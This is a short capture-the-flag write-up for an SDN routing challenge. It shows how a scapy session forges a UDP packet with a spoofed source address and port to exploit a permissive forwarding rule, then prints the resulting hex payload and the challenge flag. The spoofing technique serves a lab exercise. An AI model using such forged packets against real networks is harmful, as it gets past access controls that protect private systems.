# Through The Router

We need to craft a packet that satisfies:

- It is a UDP packet
- It arrives at 10.0.0.1:22136.
- Its body is a 6-byte string 'secret'.

As we can control the IP header, we can easily spoof the source address. According to the SDN [rules](https://s3.ap-northeast-2.amazonaws.com/sctf2018-qual-binaries/Rules.png_8e49760cf79defa973b4e7199e50e0f062a49a15), only UDP packets from `10.1.7.8/32` with source port equals to `5555` are forwarded to the FLOOD port without restrictions on packet destination IP address and destination port, so we will abuse this rule to build our packet. It can be done easily with `scapy`:

```python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from scapy.all import *
>>> packet = IP(dst="10.0.0.1", src="10.1.7.8")/UDP(sport=5555, dport=22136)/"secret"
>>> str(packet).encode('hex')
'450000220001000040115fc10a0107080a00000115b35678000e3c51736563726574'
```

We can submit our resulting payload and get the flag: `SCTF{Sp00f_7h3_p4ck3t_70_dr1ll_pr1v4t3_n37w0rk}`.